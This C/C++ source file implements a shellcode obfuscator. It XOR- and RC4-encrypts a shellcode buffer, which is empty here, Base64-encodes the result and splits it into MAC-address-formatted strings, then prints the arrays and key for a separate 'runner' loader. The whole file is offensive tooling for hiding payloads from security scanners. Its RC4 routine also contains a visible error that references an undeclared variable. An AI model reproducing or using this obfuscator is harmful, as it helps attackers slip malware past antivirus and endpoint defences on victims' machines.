#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

typedef struct {
    unsigned char S[256];
    int i, j;
} RC4State;

void InitRC4(RC4State* state, const unsigned char* key, size_t key_len) {
    for (int i = 0; i < 256; ++i) state->S[i] = (unsigned char)i;
    int j = 0;
    for (int i = 0; i < 256; ++i) {
        j = (j + state->S[i] + key[i % key_len]) & 0xFF;
        unsigned char temp = state->S[i];
        state->S[i] = state->S[j];
        state->S[j] = temp;
    }
    state->i = state->j = 0;
}

void EncryptRC4(RC4State* state, unsigned char* data, size_t len) {
    for (size_t k = 0; k < len; ++k) {
        state->i = (state->i + 1) & 0xFF;
        state->j = (state->j + state->S[state->i]) & 0xFF;
        unsigned char temp = state->S[state->i];
        state->S[state->i] = state->S[state->j];
        state->S[j] = temp;
        data[k] ^= state->S[(state->S[state->i] + state->S[state->j]) & 0xFF];
    }
}

char* EncodeBase64(const unsigned char* data, size_t data_len) {
    const char b64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    size_t encoded_len = 4 * ((data_len + 2) / 3);
    char* encoded = (char*)malloc(encoded_len + 1);
    if (!encoded) return nullptr;

    for (size_t i = 0, j = 0; i < data_len; ) {
        unsigned int a = i < data_len ? data[i++] : 0;
        unsigned int b = i < data_len ? data[i++] : 0;
        unsigned int c = i < data_len ? data[i++] : 0;
        unsigned int triple = (a << 16) + (b << 8) + c;

        encoded[j++] = b64_chars[(triple >> 18) & 0x3F];
        encoded[j++] = b64_chars[(triple >> 12) & 0x3F];
        encoded[j++] = b64_chars[(triple >> 6) & 0x3F];
        encoded[j++] = b64_chars[triple & 0x3F];
    }

    if (data_len % 3 == 1) {
        encoded[encoded_len - 2] = encoded[encoded_len - 1] = '=';
    } else if (data_len % 3 == 2) {
        encoded[encoded_len - 1] = '=';
    }
    encoded[encoded_len] = '\0';
    return encoded;
}

void EncryptXOR(unsigned char* data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; ++i) data[i] ^= key;
}

char** ConvertToMacFormat(const unsigned char* data, size_t len, int* mac_count) {
    *mac_count = (int)((len + 5) / 6);
    char** mac_array = (char**)malloc((*mac_count + 1) * sizeof(char*));
    if (!mac_array) return nullptr;

    for (int i = 0; i < *mac_count; ++i) {
        mac_array[i] = (char*)malloc(18);
        if (!mac_array[i]) {
            for (int j = 0; j < i; ++j) free(mac_array[j]);
            free(mac_array);
            return nullptr;
        }
        size_t offset = i * 6;
        sprintf(mac_array[i], "%02X-%02X-%02X-%02X-%02X-%02X",
            offset < len ? data[offset] : 0,
            offset + 1 < len ? data[offset + 1] : 0,
            offset + 2 < len ? data[offset + 2] : 0,
            offset + 3 < len ? data[offset + 3] : 0,
            offset + 4 < len ? data[offset + 4] : 0,
            offset + 5 < len ? data[offset + 5] : 0);
    }
    mac_array[*mac_count] = nullptr;
    return mac_array;
}

void PrintCArray(const char* name, const unsigned char* data, size_t len) {
    printf("unsigned char %s[] = {\n    ", name);
    for (size_t i = 0; i < len; ++i) {
        printf("0x%02x", data[i]);
        if (i < len - 1) {
            printf(", ");
            if ((i + 1) % 12 == 0) printf("\n    ");
        }
    }
    printf("\n};\n");
}

void PrintMacArray(char** mac_array, int count) {
    printf("const char* mac_shellcode[] = {\n");
    for (int i = 0; i < count; ++i) {
        printf("    \"%s\",\n", mac_array[i]);
    }
    printf("    NULL\n};\n");
}

void VerifyDecryption(const unsigned char* original, size_t len, const char* base64, const unsigned char* rc4_key) {
    printf("\n=== Decryption Verification ===\n");
    printf("Steps:\n1. MAC to Base64\n2. Base64 to binary\n3. RC4 decrypt\n4. XOR decrypt (key=0xAB)\n");
    printf("Correct execution will run the shellcode.\n");
}

int main() {
    unsigned char original_shellcode[] = "";
    size_t shellcode_len = sizeof(original_shellcode);
    unsigned char rc4_key[] = "MySecret";
    unsigned char* working_shellcode = (unsigned char*)malloc(shellcode_len);
    if (!working_shellcode) {
        printf("Memory allocation failed\n");
        return 1;
    }
    memcpy(working_shellcode, original_shellcode, shellcode_len);

    printf("=== Shellcode Obfuscator ===\n\n");
    printf("Shellcode size: %zu bytes\n", shellcode_len);
    printf("RC4 key: %s\nXOR key: 0xAB\n\n", rc4_key);

    PrintCArray("original_shellcode", original_shellcode, shellcode_len);
    EncryptXOR(working_shellcode, shellcode_len, 0xAB);
    printf("\nAfter XOR encryption:\n");
    PrintCArray("xor_encrypted", working_shellcode, shellcode_len);

    RC4State state;
    InitRC4(&state, rc4_key, strlen((char*)rc4_key));
    EncryptRC4(&state, working_shellcode, shellcode_len);
    printf("\nAfter RC4 encryption:\n");
    PrintCArray("rc4_encrypted", working_shellcode, shellcode_len);

    char* base64 = EncodeBase64(working_shellcode, shellcode_len);
    if (!base64) {
        printf("Base64 encoding failed\n");
        free(working_shellcode);
        return 1;
    }
    printf("\nBase64 encoded:\nconst char base64_shellcode[] = \"%s\";\n", base64);
    printf("Base64 size: %zu bytes\n", strlen(base64));

    int mac_count;
    char** mac_array = ConvertToMacFormat((unsigned char*)base64, strlen(base64), &mac_count);
    if (!mac_array) {
        printf("MAC conversion failed\n");
        free(working_shellcode);
        free(base64);
        return 1;
    }
    printf("\nMAC format:\nMAC count: %d\n", mac_count);
    PrintMacArray(mac_array, mac_count);

    printf("\n=== For Runner ===\n");
    printf("// Encrypted shellcode (XOR + RC4 + Base64 + MAC)\n");
    PrintMacArray(mac_array, mac_count);
    printf("const unsigned char rc4_key[] = \"%s\";\n", rc4_key);

    VerifyDecryption(original_shellcode, shellcode_len, base64, rc4_key);

    free(working_shellcode);
    free(base64);
    for (int i = 0; i < mac_count; ++i) free(mac_array[i]);
    free(mac_array);

    printf("\n=== Obfuscation Complete ===\n");
    printf("Layers: 4 (XOR, RC4, Base64, MAC)\n");
    return 0;
}